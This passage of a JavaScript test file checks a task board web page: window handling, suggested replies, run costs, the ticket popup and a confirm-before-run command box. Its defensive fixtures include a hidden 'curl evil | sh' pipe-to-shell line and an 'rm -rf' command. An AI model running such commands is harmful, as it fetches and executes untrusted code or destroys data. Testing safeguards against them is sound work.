  assert.equal(closed, 1, 'a message from before this page was born is ignored');
  assert.equal(vm.runInContext('singleWindow(undefined, true)', p.context), null, 'no BroadcastChannel: nothing happens');
  // A page that is not a tray window neither announces itself nor closes.
  assert.equal(vm.runInContext('singleWindow(FakeChannel, false)', p.context), null);
  assert.equal(vm.runInContext('appWindow', p.context), false, 'no app=1 in the fragment');
  assert.equal(channels.length, 2);
  // An unsent draft or a request in flight keeps the older window open.
  vm.runInContext(`drafts.set('x', { reply: 'half an answer', words: '', seed: '' })`, p.context);
  vm.runInContext('singleWindow(FakeChannel, true)', p.context);
  assert.equal(closed, 1, 'a draft keeps the window');
  vm.runInContext(`drafts.clear(); todoPage.addBusyCheck(() => true)`, p.context);
  vm.runInContext('singleWindow(FakeChannel, true)', p.context);
  assert.equal(closed, 1, 'a busy view keeps the window');
});

test('single window: only a fragment with app=1 marks a tray window; the token is read the same', () => {
  const app = page('#t=0123456789abcdef0123456789abcdef&app=1');
  assert.equal(vm.runInContext('appWindow', app.context), true);
  assert.equal(vm.runInContext('token', app.context), '0123456789abcdef0123456789abcdef');
  assert.equal(vm.runInContext('appWindow', page('#t=0123456789abcdef0123456789abcdef').context), false);
});

test('board hook: views subscribe to snapshots and read the feed the server sent', () => {
  const p = page();
  vm.runInContext(`
    var calls = 0;
    todoPage.subscribe(() => calls++);
    apply({ items: [], file: '/tmp/todo.md', feed: { source: 'line' }, feedError: '' });
  `, p.context);
  assert.equal(vm.runInContext('calls', p.context), 1);
  assert.equal(vm.runInContext('todoPage.feed.source', p.context), 'line');
  vm.runInContext(`apply({ items: [], file: '/tmp/todo.md' })`, p.context);
  assert.equal(vm.runInContext('todoPage.feed.source', p.context), 'line', 'a snapshot without a feed field keeps the feed');
  vm.runInContext(`apply({ items: [], file: '/tmp/todo.md', feed: null, feedError: 'feed is not valid JSON' })`, p.context);
  assert.equal(vm.runInContext('todoPage.feed', p.context), null);
  assert.equal(vm.runInContext('todoPage.feedError', p.context), 'feed is not valid JSON');
  assert.equal(vm.runInContext('calls', p.context), 3);
});

// The board (board.js) in its own VM over a fake DOM, reading state and acting through the list page's todoPage.
const boardSource = readFileSync(new URL('../todo/page/board.js', import.meta.url), 'utf8');
function boardPage(p) {
  const nodes = new Map(), docListeners = {}, opened = [];
  const make = () => {
    const n = {
      dataset: {}, value: '', hidden: false, textContent: '', title: '', elements: [], children: [], attributes: {}, listeners: {},
      style: { props: {}, setProperty(name, value) { this.props[name] = value; }, removeProperty(name) { delete this.props[name]; } },
      offsetWidth: 0, offsetHeight: 0, clientWidth: 0, classOps: [],
      classList: { contains() { return false; }, toggle(name) { n.classOps.push(['toggle', name]); }, add(name) { n.classOps.push(['add', name]); }, remove(name) { n.classOps.push(['remove', name]); } },
      addEventListener(type, fn) { this.listeners[type] = fn; },
      setAttribute(name, value) { this.attributes[name] = String(value); }, toggleAttribute() {},
      getAttribute(name) { return this.attributes[name] ?? null; }, hasAttribute(name) { return name in this.attributes; },
      removeAttribute(name) { delete this.attributes[name]; },
      querySelector: () => make(), querySelectorAll: () => [], matches: () => false, closest: () => null, contains: () => false,
      getClientRects: () => [{}], getBoundingClientRect: () => ({ left: 100, top: 100, right: 180, bottom: 136, width: 80, height: 36 }),
      focus() { context.document.activeElement = this; }, scrollIntoView() {}, click() { this.listeners.click?.({}); },
      requestSubmit() { this.listeners.submit?.({ preventDefault() {} }); }, showModal() { this.open = true; },
      append(...children) { this.children.push(...children); }, replaceChildren(...children) { this.children = children; },
      insertBefore(child, before) { const at = before ? this.children.indexOf(before) : -1; this.children.splice(at < 0 ? this.children.length : at, 0, child); },
      remove() {}, get lastElementChild() { return this.children.at(-1); }
    };
    return n;
  };
  const node = id => { if (!nodes.has(id)) nodes.set(id, make()); return nodes.get(id); };
  const rootStyle = { props: {}, setProperty(name, value) { this.props[name] = value; }, removeProperty(name) { delete this.props[name]; } };
  const context = vm.createContext({
    todoPage: p.context.todoPage,
    document: { getElementById: node, createElement: () => make(), createTextNode: text => ({ textContent: text }),
      addEventListener(type, fn) { (docListeners[type] ||= []).push(fn); },
      documentElement: { style: rootStyle }, body: { dataset: {}, classList: { add() {}, remove() {} } }, activeElement: null },
    matchMedia: () => ({ matches: false, addEventListener() {} }), getComputedStyle: () => ({ fontSize: '16px' }),
    localStorage: { getItem: () => null, setItem() {}, removeItem() {} }, ResizeObserver: class { observe() {} },
    screen: { availWidth: 1440, availHeight: 900, availLeft: 0, availTop: 0 }, innerWidth: 1440, innerHeight: 900,
    addEventListener() {},
    open(url, name, features) { const win = { url, name, features, closed: false, focus() {}, location: { href: url } }; opened.push(win); return win; },
    setTimeout, clearTimeout, setInterval() {}, clearInterval() {}, Intl, Date,
    ...i18n, ...status
  });
  context.window = context;
  vm.runInContext(boardSource.replace(/^import .* from '\.\/(?:i18n|status)\.mjs';$/gm, ''), context);
  const key = (name, extra = {}) => {
    const event = { key: name, target: context.document.body, prevented: false, preventDefault() { this.prevented = true; }, stopPropagation() {}, ...extra };
    for (const fn of docListeners.keydown || []) fn(event);
    return event;
  };
  return { context, nodes, docListeners, opened, rootStyle, key };
}
const boardItems = (p, list) => { p.context.boardItems = list; vm.runInContext('items = boardItems', p.context); };
const askItem = (id, version, suggest, extra = {}) => ({ id, version, title: `T-${id} question`, done: false, status: 'waiting', waiting: 'which one?',
  suggest, project: '', link: null, sdlc: null, others: '', brief: '', repos: [], choices: [], pick: null, run: '', pin: false,
  events: [{ at: '2026-11-23 09:00', who: 'agent', what: 'waiting — which one?' }], notes: [], ...extra });

test('board suggest: the answer box starts with the suggestion; an edit stays, a new suggestion replaces an unedited one', () => {
  const p = page('#t=test-token');
  boardItems(p, [askItem('aaaaaa', 'v1', '조치했어요'), askItem('bbbbbb', 'v1', 'B안')]);
  const b = boardPage(p);
  const field = b.nodes.get('panel-reply-text');
  const keyOf = id => vm.runInContext(`render(); cards.find(card => card.target.id === '${id}').key`, b.context);
  vm.runInContext(`select('${keyOf('aaaaaa')}', false)`, b.context);
  assert.equal(field.value, '조치했어요', 'fill');
  boardItems(p, [askItem('aaaaaa', 'v2', '다시 확인'), askItem('bbbbbb', 'v1', 'B안')]);
  vm.runInContext('render()', b.context);
  assert.equal(field.value, '다시 확인', 'a newer suggestion replaces an unedited one');
  field.value = '내 답';
  field.listeners.input();
  boardItems(p, [askItem('aaaaaa', 'v3', '세 번째'), askItem('bbbbbb', 'v1', 'B안')]);
  vm.runInContext('render()', b.context);
  assert.equal(field.value, '내 답', 'an edit is never overwritten');
  vm.runInContext(`select('${keyOf('bbbbbb')}', false)`, b.context);
  assert.equal(field.value, 'B안', 'another card shows its own suggestion');
  vm.runInContext(`select('${keyOf('aaaaaa')}', false)`, b.context);
  assert.equal(field.value, '내 답', 'switching cards keeps each card\'s draft');
});

test('board suggest: a done item fills nothing, and an unedited suggestion never keeps the window', () => {
  const p = page(); // no token: no load in flight, which would count as busy on its own
  boardItems(p, [askItem('cccccc', 'v1', '조치했어요', { done: true, status: 'done',
    events: [{ at: '2026-11-23 09:00', who: 'human', what: 'done' }] }), askItem('dddddd', 'v1', '네')]);
  const b = boardPage(p);
  const field = b.nodes.get('panel-reply-text');
  const keyOf = id => vm.runInContext(`render(); cards.find(card => card.target.id === '${id}').key`, b.context);
  vm.runInContext(`select('${keyOf('cccccc')}', false)`, b.context);
  assert.equal(field.value, '', 'done-empty');
  vm.runInContext(`select('${keyOf('dddddd')}', false)`, b.context);
  assert.equal(field.value, '네');
  const busy = () => vm.runInContext('busyChecks.some(check => check())', p.context);
  assert.equal(busy(), false, 'a suggestion the person did not touch is not an unsent draft');
  field.value = '아니요';
  field.listeners.input();
  assert.equal(busy(), true, 'an edited answer keeps the window');
});

const runAt = (hour, extra = {}) => ({ key: `T-${hour}`, label: 'run', outcome: 'ok',
  startedAt: new Date(new Date().setHours(hour, 0, 0, 0)).toISOString(), endedAt: new Date(new Date().setHours(hour, 30, 0, 0)).toISOString(), ...extra });
function runsBoard(runs, lang = 'en') {
  const p = page('#t=test-token');
  if (lang !== 'en') vm.runInContext(`setLanguage('${lang}')`, p.context);
  p.context.boardFeed = { runs };
  vm.runInContext('feed = boardFeed', p.context);
  const b = boardPage(p);
  vm.runInContext(`chosenView = 'runs'; render()`, b.context);
  const clock = ms => new Intl.DateTimeFormat(lang, { hour: '2-digit', minute: '2-digit', hourCycle: 'h23' }).format(ms);
  return { titles: b.nodes.get('runs-track').children.map(bar => bar.title), summary: b.nodes.get('runs-summary').textContent,
    span: run => `${clock(Date.parse(run.startedAt))}–${clock(Date.parse(run.endedAt))}` };
}

test('board runs: a feed without cost or tokens renders exactly as before', () => {
  const run = runAt(9);
  const view = runsBoard([run]);
  assert.deepEqual(view.titles, [`${view.span(run)} · Done`]);
  assert.equal(view.summary, '08:00–19:00 · done 1 · failed 0 · no result 0');
});

test('board runs: a run\'s cost and tokens join its title; the day sums the known cost', () => {
  const runs = [runAt(9, { costUsd: 0.951, tokens: 961234 }), runAt(11, { costUsd: 2, tokens: null })];
  const en = runsBoard(runs);
  assert.deepEqual(en.titles, [`${en.span(runs[0])} · Done · $0.95 · 961K tokens`, `${en.span(runs[1])} · Done · $2.00`]);
  assert.equal(en.summary, '08:00–19:00 · done 2 · failed 0 · no result 0 · cost $2.95');
  const ko = runsBoard(runs, 'ko');
  assert.equal(ko.titles[0], `${ko.span(runs[0])} · 완료 · $0.95 · 96만 토큰`);
  assert.match(ko.summary, / · 비용 \$2\.95$/);
});

test('board runs: some runs without a cost mark the day sum as partial; junk values count as unknown', () => {
  const runs = [runAt(9, { costUsd: 1.5 }), runAt(11, { costUsd: null, tokens: 5000 }), runAt(13, { costUsd: '3', tokens: 1.5 })];
  const en = runsBoard(runs);
  assert.deepEqual(en.titles, [`${en.span(runs[0])} · Done · $1.50`, `${en.span(runs[1])} · Done · 5K tokens`, `${en.span(runs[2])} · Done`]);
  assert.match(en.summary, / · cost \$1\.50 · some cost unknown$/);
  assert.match(runsBoard(runs, 'ko').summary, / · 비용 \$1\.50 · 일부 비용 모름$/);
});

// ---------- v3.3.4: ticket popup at the left, panel stays right; v3.3.3: keys, Enter to send, tooltips ----------
const linked = (id, extra = {}) => askItem(id, 'v1', '', { link: { label: `T-${id}`, url: `https://tracker.invalid/browse/T-${id}` }, ...extra });
function selectedBoard(list) {
  const p = page('#t=test-token');
  boardItems(p, list);
  const b = boardPage(p);
  const keyOf = id => vm.runInContext(`render(); cards.find(card => card.target.id === '${id}').key`, b.context);
  vm.runInContext(`select('${keyOf(list[0].id)}', false)`, b.context);
  const sent = () => p.requests.filter(r => r.url === '/api/item').map(r => JSON.parse(r.options.body));
  return { p, b, sent, view: b.nodes.get('board-view') };
}

const features = win => Object.fromEntries(win.features.split(',').map(pair => pair.split('=')));

test('ticket: the popup docks to the screen\'s left edge at 45% width and full height', () => {
  const { b } = selectedBoard([linked('aaaaaa')]);
  Object.assign(b.context.screen, { availWidth: 1440, availHeight: 875, availLeft: -1440, availTop: 25 });
  b.nodes.get('panel').offsetWidth = 400;
  assert.equal(b.key('t').prevented, true, 't opens the ticket');
  assert.equal(b.opened.length, 1);
  assert.equal(b.opened[0].name, 'sdlc-ticket');
  assert.deepEqual(features(b.opened[0]), { popup: 'yes', width: '648', height: '875', left: '-1440', top: '25' },
    'left = availLeft, top = availTop, 45% of the width, full available height');
});

test('ticket: a panel wider than 55% of the screen shrinks the popup so both fit, never below 480px', () => {
  const widthFor = (screenWidth, panelWidth) => {
    const { b } = selectedBoard([linked('aaaaaa')]);
    Object.assign(b.context.screen, { availWidth: screenWidth, availLeft: 0, availTop: 0 });
    b.nodes.get('panel').offsetWidth = panelWidth;
    b.key('t');
    return features(b.opened[0]);
  };
  assert.equal(widthFor(1440, 600).width, '648', 'a common panel leaves 45%');
  assert.equal(widthFor(1440, 900).width, '524', 'screen less the panel less a 16px gap');
  assert.equal(widthFor(1440, 1100).width, '480', 'the minimum');
  assert.equal(widthFor(1440, 900).left, '0');
});

test('ticket: the panel never moves when the ticket opens, follows or closes', () => {
  const { p, b, view } = selectedBoard([linked('aaaaaa'), linked('bbbbbb')]);
  const panel = b.nodes.get('panel'), handle = b.nodes.get('panel-resize');
  const side = () => ({ dock: view.dataset.dock, viewClasses: view.classOps.length, panelClasses: panel.classOps.length,
    handleClasses: handle.classOps.length, cap: view.style.props['--panel-cap'] });
  const before = side();
  assert.equal(before.dock, undefined);
  b.key('t');
  assert.deepEqual(side(), before, 'opening changes no attribute or class on the panel');
  b.key('j');
  assert.equal(b.opened[0].location.href, 'https://tracker.invalid/browse/T-bbbbbb', 'the popup follows the selection');
  b.opened[0].closed = true;
  boardItems(p, [linked('aaaaaa', { version: 'v2' }), linked('bbbbbb')]);
  vm.runInContext('render()', b.context);
  b.key('t');
  assert.equal(b.opened.length, 2, 'a closed popup opens again');
  assert.equal(features(b.opened[1]).left, '0');
  assert.equal(view.dataset.dock, undefined, 'closing and reopening never docks the panel');
});

test('ticket: in the tray app\'s window the page asks the app (window.ipc) and opens no popup', () => {
  const { b } = selectedBoard([linked('aaaaaa'), linked('bbbbbb'), askItem('cccccc', 'v1', '')]);
  const posts = [];
  b.context.ipc = { postMessage(message) { posts.push(message); } };
  b.key('j');
  assert.deepEqual(posts, [], 'no ticket opened yet: a selection asks for nothing');
  b.key('k');
  assert.equal(b.key('t').prevented, true);
  assert.deepEqual(posts, ['{"open":"https://tracker.invalid/browse/T-aaaaaa"}'], 'exactly one message, the open');
  b.key('t');
  assert.equal(posts[1], '{"open":"https://tracker.invalid/browse/T-aaaaaa"}', 'the same ticket again asks again (Chrome brings it back)');
  b.key('j');
  assert.equal(posts[2], '{"follow":"https://tracker.invalid/browse/T-bbbbbb"}', 'the selection follows');
  b.key('j');
  assert.equal(posts.length, 3, 'an item without a ticket moves nothing');
  b.nodes.get('panel-ticket').click();
  assert.equal(posts.length, 3, 'the button on an item without a ticket does nothing');
  assert.equal(b.opened.length, 0, 'never window.open in the app');
});

test('ticket: in the app a link to this machine is refused with a message, not sent to the app', () => {
  const local = (id, url) => askItem(id, 'v1', '', { link: { label: id, url } });
  const { p, b } = selectedBoard([local('aaaaaa', 'http://127.0.0.1:5173/x'), local('bbbbbb', 'http://LOCALHOST./y'),
    local('cccccc', 'http://[::1]:8080/'), linked('dddddd'), local('eeeeee', 'http://127.0.0.1:9/z')]);
  const posts = [], errors = [];
  b.context.ipc = { postMessage(message) { posts.push(message); } };
  const shown = p.context.todoPage.showError;
  p.context.todoPage.showError = error => errors.push(error);
  try {
    b.key('t'); b.key('j'); b.key('t'); b.key('j'); b.key('t');
    assert.deepEqual(posts, [], 'no loopback address reaches the app');
    assert.deepEqual(errors.map(error => error.key), ['panel.notTicket', 'panel.notTicket', 'panel.notTicket']);
    b.key('j'); b.key('t');
    assert.deepEqual(posts, ['{"open":"https://tracker.invalid/browse/T-dddddd"}']);
    b.key('j');
    assert.equal(posts.length, 1, 'the selection does not follow to a loopback address');
    assert.equal(errors.length, 3, 'and says nothing for a mere selection');
  } finally { p.context.todoPage.showError = shown; }
  assert.equal(p.context.todoPage.t('panel.notTicket'), p.context.todoPage.lang === 'ko' ? '이 링크는 티켓 창으로 열 수 없어요' : 'This link cannot open in the ticket window');
});

test('ticket: outside the app (no window.ipc, or one without postMessage) the popup opens as before', () => {
  const { b } = selectedBoard([linked('aaaaaa')]);
  b.context.ipc = {};
  b.key('t');
  assert.equal(b.opened.length, 1);
  assert.equal(b.opened[0].name, 'sdlc-ticket');
});

test('ticket: the panel handle keeps the right-side keys, ← widens and → narrows', () => {
  const { b, view } = selectedBoard([linked('aaaaaa')]);
  view.clientWidth = 1600;
  b.nodes.get('panel').offsetWidth = 400;
  const resize = name => { b.nodes.get('panel-resize').listeners.keydown({ key: name, shiftKey: false, preventDefault() {}, stopPropagation() {} }); return b.rootStyle.props['--panel-size']; };
  b.key('t');
  assert.equal(resize('ArrowLeft'), '416px', 'with the ticket open ← still widens');
  assert.equal(resize('ArrowRight'), '384px');
  assert.equal(resize('End'), '1216px', 'no cap: board width less 24rem');
});

test('keys: Enter sends the reply; Shift+Enter and an IME-composing Enter do not', () => {
  const { b, sent } = selectedBoard([askItem('aaaaaa', 'v1', '조치했어요')]);
  const field = b.nodes.get('panel-reply-text');
  const press = extra => { const event = { key: 'Enter', shiftKey: false, prevented: false, preventDefault() { this.prevented = true; }, ...extra }; field.listeners.keydown(event); return event; };
  assert.equal(press({ shiftKey: true }).prevented, false, 'Shift+Enter keeps its newline');
  assert.equal(press({ isComposing: true }).prevented, true, 'composing Enter only confirms the syllable');
  press({ keyCode: 229 });
  assert.equal(sent().length, 0, 'nothing sent while composing or on Shift+Enter');
  press({});
  assert.deepEqual(sent().map(body => body.text), ['조치했어요'], 'one Enter sends the prefilled suggestion');
});

test('keys: the list reply box sends on Enter the same way', () => {
  const p = page('#t=test-token');
  let submitted = 0;
  p.nodes.get('reply-form').requestSubmit = () => submitted++;
  const press = extra => p.nodes.get('reply-text').listeners.keydown({ key: 'Enter', shiftKey: false, preventDefault() {}, ...extra });
  press({ shiftKey: true });
  press({ isComposing: true });
  press({ keyCode: 229 });
  assert.equal(submitted, 0);
  press({});
  assert.equal(submitted, 1);
});

test('keys: number keys press the choices; single keys do nothing inside a text box', () => {
  const { b, sent } = selectedBoard([askItem('aaaaaa', 'v1', '', { choices: ['A안', 'B안'] })]);
  assert.equal(b.key('2', { target: { tagName: 'TEXTAREA' } }).prevented, false, 'typing a 2 stays text');
  for (const name of ['t', 'm', 'r', 'a', '?']) b.key(name, { target: { tagName: 'INPUT' } });
  assert.equal(sent().length, 0);
  assert.equal(b.nodes.get('keys-help').open, undefined);
  assert.equal(b.key('9').prevented, false, 'no ninth choice');
  assert.equal(b.key('2').prevented, true);
  assert.deepEqual(sent().map(body => body.text), ['B안']);
  const choice = b.nodes.get('panel-choices').children[0];
  assert.equal(choice.attributes['aria-keyshortcuts'], '1');
});

test('keys: A moves focus to Approve and shows its tooltip but never approves; ? opens the key list', () => {
  const { p, b } = selectedBoard([askItem('aaaaaa', 'v1', '')]);
  const approve = b.nodes.get('panel-approve');
  b.nodes.get('panel-gate').hidden = false;
  approve.textContent = '승인';
  assert.equal(b.key('a').prevented, true);
  assert.equal(b.context.document.activeElement, approve);
  assert.equal(p.requests.filter(r => r.url === '/api/approve').length, 0, 'a key never approves');
  assert.equal(b.nodes.get('tip').hidden, false);
  assert.equal(b.nodes.get('tip').textContent, '승인 (A, Enter)');
  assert.equal(approve.attributes['aria-describedby'], 'tip', 'the shown tooltip describes its control');
  assert.equal(b.key('Escape').prevented, true, 'Escape first dismisses the tooltip');
  assert.equal(b.nodes.get('tip').hidden, true);
  assert.equal(approve.attributes['aria-describedby'], undefined);
  b.key('?');
  assert.equal(b.nodes.get('keys-help').open, true);
  assert.equal(b.nodes.get('keys-list').children.length, 26, 'thirteen keys, each a term and its action');
});

test('tooltips: each control names its action and its key, from the locale', () => {
  const p = page('#t=test-token');
  vm.runInContext(`setLanguage('ko')`, p.context);
  boardItems(p, [askItem('aaaaaa', 'v1', '', { choices: ['A안'] })]);
  const b = boardPage(p);
  vm.runInContext(`select(cards[0].key, false)`, b.context);
  const tip = id => vm.runInContext(`tipText(document.getElementById('${id}'))`, b.context);
  for (const [id, text] of [['panel-ticket', '티켓 열기'], ['panel-send', '답 보내기'], ['panel-more', '자세히'], ['panel-fix', '자가 조치']]) b.nodes.get(id).textContent = text;
  b.nodes.get('panel-prev').attributes['aria-label'] = '이전 (← 또는 k)';
  assert.equal(tip('panel-ticket'), '티켓 열기 (T)');
  assert.equal(tip('panel-send'), '답 보내기 (Enter)');
  assert.equal(tip('panel-more'), '자세히 (M)');
  assert.equal(tip('panel-fix'), '자가 조치 (F)');
  assert.equal(tip('panel-prev'), '이전 (← 또는 k)', 'a label that already names its keys is shown as is');
  assert.equal(b.nodes.get('panel-ticket').attributes['aria-keyshortcuts'], 'T');
  assert.equal(b.nodes.get('panel-choices').children[0].dataset.tip, '1 · A안');
});

// ---------- a command the board runs for the person ----------
const command = { argv: ['rm', '-rf', '/tmp/dist dev'], cwd: '/tmp', why: '남은 빌드 폴더가 다음 빌드를 막아요' };
const withExec = (exec, extra = {}) => ({ exec, execPath: '/bin/rm', ...extra });
function runBoard(list, result = { exitCode: 0, stdout: 'done\n', stderr: '', timedOut: false }) {
  let finish;
  const answered = new Promise(resolve => { finish = resolve; });
  const p = page('#t=test-token', { fetch: async url => {
    if (url === '/api/exec') { await answered; return { ok: true, text: async () => JSON.stringify({ exec: result }) }; }
    return url === '/api/items' ? new Promise(() => {}) : { ok: true, text: async () => '{}' };
  } });
  boardItems(p, list);
  const b = boardPage(p);
  vm.runInContext(`select(cards[0].key, false)`, b.context);
  const box = b.nodes.get('panel-run'), dialog = p.nodes.get('run-confirm');
  const button = () => box.children.find(n => n.className === 'actions')?.children[0];
  const runs = () => p.requests.filter(r => r.url === '/api/exec').map(r => JSON.parse(r.options.body));
  return { p, b, box, dialog, button, runs, finish };
}
const text = node => [node.textContent || '', ...(node.children || []).map(text)].join(' ');

test('run box: only an item with a command shows the block and its button, with the exact command, cwd and why', () => {
  const plain = runBoard([askItem('aaaaaa', 'v1', '')]);
  assert.equal(plain.box.hidden, true, 'no command, no block');
  assert.equal(plain.button(), undefined);
  assert.equal(plain.b.key('x').prevented, false, 'X does nothing without a command');
  const { box, button } = runBoard([askItem('aaaaaa', 'v1', '', withExec(command))]);
  assert.equal(box.hidden, false);
  const shown = text(box);
  assert.match(shown, /Command to run/);
  assert.ok(shown.includes("rm -rf '/tmp/dist dev'"), shown);
  assert.match(shown, /Runs in +\/tmp/);
  assert.ok(shown.includes(command.why));
  assert.equal(button().textContent, 'Run command');
  assert.equal(button().attributes['aria-keyshortcuts'], 'X');
  const done = runBoard([askItem('aaaaaa', 'v1', '', withExec(command, { done: true, status: 'done' }))]);
  assert.equal(done.box.hidden, true, 'a done item offers nothing to run');
});

// Keys pressed in the dialog: `on` names what has focus (the title, a text, or a button).
const enterIn = (dialog, on = 'title', extra = {}) => {
  const event = { key: 'Enter', target: { closest: selector => (on === 'button' && selector === 'button' ? {} : null) }, preventDefault() { this.prevented = true; }, ...extra };
  dialog.listeners.keydown(event);
  return event;
};
const settle = () => new Promise(resolve => setTimeout(resolve, 0));
test('run box: nothing runs without the confirm dialog; Cancel and Esc run nothing, Run sends the shown version and program once', async () => {
  const { p, b, box, dialog, button, runs, finish } = runBoard([askItem('aaaaaa', 'v1', '', withExec(command))]);
  button().listeners.click();
  assert.equal(dialog.open, true, 'the button only opens the dialog');
  assert.equal(p.nodes.get('run-confirm-command').textContent, "rm -rf '/tmp/dist dev'", 'the dialog repeats the exact command');
  assert.equal(p.nodes.get('run-confirm-cwd').textContent, '/tmp');
  assert.equal(p.nodes.get('run-confirm-program').textContent, '/bin/rm', 'the program that will start');
  assert.equal(p.nodes.get('run-confirm-args').textContent, '3 arguments');
  assert.equal(p.nodes.get('run-confirm-escaped').hidden, true, 'nothing hidden, no warning');
  assert.equal(runs().length, 0);
  dialog.returnValue = 'cancel'; dialog.close();
  dialog.showModal(); dialog.returnValue = ''; dialog.close(); // Esc closes with no value
  await settle();
  assert.equal(runs().length, 0, 'Cancel and Esc run nothing');
  assert.equal(b.key('x').prevented, true, 'X opens it');
  assert.equal(dialog.open, true);
  vm.runInContext('openedAt = 0', p.context); // past the reading pause
  const enter = enterIn(dialog);
  assert.equal(enter.prevented, true, 'Enter on the title confirms');
  assert.equal(dialog.open, false);
  await settle(); // the request starts once focus is back on the page
  assert.deepEqual(runs(), [{ id: 'aaaaaa', version: 'v1', path: '/bin/rm' }]);
  assert.match(text(box), /Running…/, 'a spinner while it runs');
  assert.equal(box.attributes['aria-busy'], 'true');
  finish();
  await settle(); await settle();
  assert.match(text(box), /Finished · exit 0/);
  assert.match(text(box), /done/, 'the output tail');
});

test('run dialog: a held or early Enter never confirms; focus starts on the title, not on Run', async () => {
  const html = readFileSync(new URL('../todo/page/index.html', import.meta.url), 'utf8');
  const dialogHtml = html.slice(html.indexOf('<dialog id="run-confirm"'), html.indexOf('</dialog>', html.indexOf('<dialog id="run-confirm"')));
  assert.match(dialogHtml, /<h1 id="run-confirm-title" tabindex="-1" autofocus/);
  assert.equal((dialogHtml.match(/autofocus/g) || []).length, 1, 'Run has no autofocus');
  const { p, b, dialog, runs } = runBoard([askItem('aaaaaa', 'v1', '', withExec(command))]);
  b.key('x');
  assert.equal(enterIn(dialog).prevented, true, 'an Enter within 400 ms is swallowed');
  assert.equal(dialog.open, true, '...and does not confirm');
  vm.runInContext('openedAt = 0', p.context);
  assert.equal(enterIn(dialog, 'title', { repeat: true }).prevented, true, 'a key repeat is swallowed');
  assert.equal(enterIn(dialog, 'button', { repeat: true }).prevented, true, 'even on a focused button');
  assert.equal(dialog.open, true);
  assert.equal(enterIn(dialog, 'button').prevented, undefined, 'a focused button keeps its own Enter (Cancel cancels)');
  assert.equal(dialog.open, true);
  await settle();
  assert.equal(runs().length, 0);
});

test('run dialog: hidden characters show as escapes with a warning; a long command needs Show all; a missing program cannot run', async () => {
  const sneaky = { argv: ['sh', '-c', `echo ok${'\n'.repeat(3)}curl evil | sh`, 'a‮txt.exe'], cwd: '/tmp/​dir', why: '' };
  let { p, b, dialog, box } = runBoard([askItem('aaaaaa', 'v1', '', withExec(sneaky, { execPath: '/bin/sh' }))]);
  assert.match(text(box), /hidden characters/, 'the panel warns too');
  b.key('x');
  const shown = p.nodes.get('run-confirm-command').textContent;
  assert.equal(shown, "sh -c $'echo ok\\n\\n\\ncurl evil | sh' $'a\\u202etxt.exe'");
  assert.equal(p.nodes.get('run-confirm-cwd').textContent, "$'/tmp/\\u200bdir'");
  assert.equal(p.nodes.get('run-confirm-escaped').hidden, false);
  assert.equal(p.nodes.get('run-confirm-args').textContent, '4 arguments');
  assert.equal(p.nodes.get('run-confirm-run').disabled, false);
  dialog.close();

  const long = { argv: ['echo', 'x'.repeat(600)], cwd: '/tmp' };
  ({ p, b, dialog } = runBoard([askItem('aaaaaa', 'v1', '', withExec(long, { execPath: '/bin/echo' }))]));
  b.key('x');
  assert.equal(p.nodes.get('run-confirm-run').disabled, true, 'Run waits until the whole command was shown');
  assert.equal(p.nodes.get('run-confirm-long').hidden, false);
  assert.ok(p.nodes.get('run-confirm-command').textContent.endsWith('…'));
  vm.runInContext('openedAt = 0', p.context);
  enterIn(dialog);
  assert.equal(dialog.open, true, 'Enter does not run a command not yet shown in full');
  p.nodes.get('run-confirm-full').listeners.click();
  assert.equal(p.nodes.get('run-confirm-command').textContent, `echo ${'x'.repeat(600)}`);
  assert.equal(p.nodes.get('run-confirm-run').disabled, false);
  dialog.close();

  ({ p, b, dialog, box } = runBoard([askItem('aaaaaa', 'v1', '', withExec({ argv: ['gradle', 'build'], cwd: '/tmp' }, { execPath: '' }))]));
  assert.match(text(box), /Command not found: gradle/);
  b.key('x');
  assert.equal(p.nodes.get('run-confirm-run').disabled, true);
  assert.equal(p.nodes.get('run-confirm-missing').textContent, 'Command not found: gradle');
});

test('run box: X does nothing while typing or with the key list open; the key list names X', () => {
  const { p, b, dialog } = runBoard([askItem('aaaaaa', 'v1', '', withExec(command))]);
  assert.equal(b.key('x', { target: { tagName: 'TEXTAREA' } }).prevented, false);
  assert.equal(dialog.open, undefined);
  b.key('?');
  assert.ok(b.nodes.get('keys-list').children.some(n => text(n).includes('Run the command')));
  void p;
});

test('run box: the list page details show the same block and button', () => {
  const p = page();
  vm.runInContext(`items = [${JSON.stringify(askItem('aaaaaa', 'v1', '', withExec(command, { run: 'open -a Terminal /x.command' })))}]; openDetail('aaaaaa');`, p.context);
  const box = p.nodes.get('detail-run');
  assert.equal(box.hidden, false);
  assert.ok(text(box).includes("rm -rf '/tmp/dist dev'"));
  assert.ok(p.nodes.get('detail-fields').children.some(n => n.textContent === 'Run in a terminal'), 'the terminal run still shows beside it');
  const button = box.children.find(n => n.className === 'actions').children[0];
  button.listeners.click();
  assert.equal(p.nodes.get('run-confirm').open, true);
  assert.equal(p.requests.filter(r => r.url === '/api/exec').length, 0);
});
